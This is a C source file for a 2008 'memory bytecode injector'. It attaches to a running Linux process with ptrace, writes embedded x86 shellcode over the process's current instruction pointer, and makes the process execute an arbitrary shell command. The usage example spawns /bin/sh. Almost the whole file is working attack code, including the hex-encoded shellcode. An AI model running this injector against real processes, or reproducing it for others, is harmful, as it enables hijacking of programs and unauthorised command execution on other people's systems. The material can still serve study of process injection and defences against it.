/*
 *  * Memory bytecode injector
 *   * by BlackLight, copyleft 2008
 *    * Released under GPL licence 3.0
 *     *
 *      * This short application allows you to inject arbitrary
 *       * code into a running process (runned by a user with
 *        * your same privileges or less), hijacking its flow to
 *         * execute an arbitrary command (yes, it includes a
 *          * built-in shellcode generator too).
 *           *
 *            * Usage:
 *             * ./meminj -p <pid> -c <cmd>
 *              * Example:
 *               * ./meminj -p 1234 -c "/bin/sh"
 *                */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <sys/user.h>

char code[] =
"\x60\x31\xc0\x31\xd2\xb0\x0b\x52\x68\x6e\x2f\x73"
"\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x68\x2d\x63"
"\x63\x63\x89\xe1\x52\xeb\x07\x51\x53\x89\xe1\xcd"
"\x80\x61\xe8\xf4\xff\xff\xff";

void banner()  {
	printf ("~~~~~~ Memory bytecode injector by BlackLight ~~~~~~\n"
				"  ====      Released under GPL licence 3        ====\n\n");
}

void help()  {
	printf (" [-] Usage: %s -p <pid> -c <command>\n");
}

main(int argc, char **argv)  {
	int i,j,c,size,pid=0;
	char *cmd=NULL;
	struct user_regs_struct reg;
	char *buff;

	banner();

	while ((c=getopt(argc,argv,"p:c:"))>0)  {
		switch (c)  {
			case 'p':
				pid=atoi(optarg);
				break;

			case 'c':
				cmd=strdup(optarg);
				break;

			default:
				help();
				exit(1);
				break;
		}
	}

	if (!pid || !cmd)  {
		help();
		exit(1);
	}

	size = sizeof(code)+strlen(cmd)+2;
	buff = (char*) malloc(size);
	memset (buff,0x0,size);
	memcpy (buff,code,sizeof(code));
	memcpy (buff+sizeof(code)-1,cmd,strlen(cmd));

	ptrace (PTRACE_ATTACH,pid,0,0);
	wait ((int*) 0);

	ptrace (PTRACE_GETREGS,pid,0,&reg);
	printf (" [+] Writing EIP @ 0x%.8x, process %d\n",reg.eip, pid);

	for (i=0; i<size; i++)
	  ptrace (PTRACE_POKETEXT, pid, reg.eip+i, *(int*) (buff+i));

	ptrace (PTRACE_DETACH,pid,0,0);
	free(buff);
}
